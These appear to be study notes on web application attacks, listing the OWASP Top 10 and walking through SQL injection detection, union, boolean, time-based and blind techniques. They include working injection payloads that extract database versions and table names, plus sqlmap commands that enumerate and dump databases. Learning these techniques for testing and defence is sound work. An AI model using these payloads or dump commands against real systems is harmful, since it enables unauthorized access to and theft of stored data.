# Web Application Attacks & SQL Injection

## OWASP TOP 10
1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Authentication Failures
8. Software and Data Integrity Failures
9. Logging and Monitoring Failures
10. Server-Side Request Forgery (SSRF)

## SQL Injection Detection
Try single and double quotes: '', ""
Comments: --, #
Test payloads:
```
<name>' or 1=1#
<name>' union select null, null#
```

## URL Encoding
- ' = %27
- " = %22
- # = %23
- ; = %3B
- ) = %29

## Union-Based Injection
Determine column count:
```
<name>' union select null, null, null#
```

Extract data:
```
<name>' union select null,null,version()#
<name>' union select null,null,table_name from information_schema.tables#
```

## Boolean-Based Injection
Use conditional statements to control response
If true, original query response returned
If false, no output

## Time-Based Injection
Use SLEEP() function to delay response
Useful when no obvious output is returned

## Blind SQL Injection
No obvious clue when executed
Requires conditional logic for data extraction

## SQL-Map Automation
Save HTTP POST request as .txt
```
sqlmap -r request.txt --dbs
sqlmap -r request.txt -D database --tables
sqlmap -r request.txt -D database -T table --dump
```
